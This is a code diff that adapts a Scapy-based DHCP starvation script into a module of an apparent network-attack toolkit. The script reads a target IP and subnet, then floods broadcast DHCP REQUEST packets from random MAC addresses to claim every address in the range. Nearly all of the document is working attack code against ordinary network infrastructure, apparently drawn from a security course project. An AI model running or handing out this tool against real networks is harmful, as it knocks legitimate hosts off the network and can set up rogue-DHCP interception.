@@ -1,27 +1,38 @@
 # https://github.com/shamiul94/DHCP-Spoofing-Attack-Network-Security/blob/master/Final-Codes/Request_Starve.py
-from scapy.all import *
-from scapy.layers.dhcp import DHCP, BOOTP
-from scapy.layers.inet import IP, UDP
-from scapy.layers.l2 import Ether
+from Project import *
+import ipaddress
 
-offer_count = 0
+req_port = 67
+name = "DHCP Starvation"
+function_name = "starve"
 
 
-def starve():
+def starve(values):
 
-    good_dhcp_server_IP = '192.168.0.1'
-    subnet = '192.168.0.'
-    ip_pool_start = 99
-    current_ip = ip_pool_start
     requested_IP = ''
+    
+    print("Running DHCP starvation:\n")
+    valid_var = ["target_ip", "subnet"]
+    help_statement = "\nsends a multitude of DHCP queries to attempt to create leases for all available IP addresses"
+    variable_input(valid_var, help_statement, values)
+    all_variables_inputted(values, valid_var)
+    check_var(values, valid_var)
+    iface = ipaddress.ip_network(values.get("target_ip") + "/" + values.get("subnet"), strict=False)
+    octets = str(iface.network_address).split(".")
+    ip_pool_start = int(octets[3]) + 1
+    octets = str(iface.broadcast_address).split(".")
+    last_ip = int(octets[3]) - ip_pool_start
+    subnet = str(iface.network_address).split(".")
+    del subnet[-1]
+    subnet = ".".join(subnet)
+    subnet = subnet + "."
 
-    for i in range(12):
-        fake_src_mac = RandMAC()
-        current_ip = (ip_pool_start + i)
+    for i in range(1,last_ip):
+        current_ip = (int(ip_pool_start) + int(i))
         requested_IP = subnet + str(current_ip)
         print(requested_IP)
 
-        request_packet = (Ether(dst='ff:ff:ff:ff:ff:ff', src=mac2str(fake_src_mac), type=2048)
+        request_packet = (Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=2048)
                           / IP(src='0.0.0.0', dst='255.255.255.255')
                           / UDP(sport=68, dport=67)
                           / BOOTP(op=1, htype=1, hlen=6, hops=0, xid=176591826, secs=0,
@@ -45,12 +56,9 @@ def starve():
                           / DHCP(options=[('message-type', 3),
                                           ('client_id', b'\x01\xa4PF|\x12\x91'),
                                           ('requested_addr', requested_IP),
-                                          ('server_id', good_dhcp_server_IP),
+                                          ('server_id', values.get("target_ip")),
                                           ('max_dhcp_size', 1500),
                                           ('param_req_list', [1, 3, 6, 15, 26, 28, 51, 58, 59, 43]), 'end', 'pad']))
-        sendp(request_packet, iface='wlo1')
-
-
-if __name__ == "__main__":
-    while True:
-        starve()
+        sendp(request_packet, iface=values.get("iface"))
+        
+    print("Starvation complete")
